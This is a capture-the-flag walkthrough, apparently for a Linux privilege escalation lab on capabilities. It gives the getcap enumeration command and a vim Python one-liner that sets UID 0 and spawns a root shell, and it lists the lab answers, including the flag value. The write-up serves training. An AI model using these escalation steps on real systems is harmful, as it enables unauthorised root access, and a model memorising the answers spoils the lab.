## Another method of privilege escalation in Linux is through Capabilities, which allow system administrators to grant specific privileges to binaries without giving full root access.

### Finding Capabilities
- Use: ```getcap -r / 2>/dev/null``` to list binaries with capabilities (redirecting errors to /dev/null).
- Unlike SUID binaries, capabilities won’t show up in standard SUID enumeration.
- Check GTFOBins for exploitable binaries with capabilities.

#### Privilege Escalation Using Capabilities
- If a binary (e.g., vim) has capabilities set, it can be leveraged to spawn a root shell using specific commands.
- Some tools (like vim) allow privilege escalation even without the SUID bit.
By identifying binaries with capabilities, attackers can execute privileged actions without full root access, making this an important attack vector to check during system enumeration.

### Q.1: Complete the task described above on the target system
The command you have to run mentioned in the task is as follows: ```getcap -r / 2>/dev/null```
Checking capabilities

### Answer: No answer needed

### Q.2: How many binaries have set capabilities?

We can see in the above command that there are 6 binaries with set capabilities.
### Answer: 6

### Q.3: What other binary can be used through its capabilities?
If the binary has the Linux **CAP_SETUID** capability set or it is executed by another binary with the capability set, 
it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

After running the ```getcap -r /``` command and scroll down to the bottom. We can see the other binary is view.

```/home/ubuntu/view = cap_setuid+ep```
### Answer: view

### Q.4: What is the content of the flag4.txt file?
To do this, simply enter the following command into your terminal: 
```./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```.This will open up a shell.

Notice the py3 instead of py. This has given us **root**.
Type **id**, it would show this: ```uid=0(root) gid=1001(karen) groups=1001(karen)```. Or type ```whoami``` this shows ```root```

Now, find the flag using this command: ```find / -name flag4.txt 2>/dev/null```. It will show the result ```/home/ubuntu/flag4.txt```.

Finally to view text file content, use: ```cat /home/ubuntu/flag4.txt```

## Answer: THM-9349843
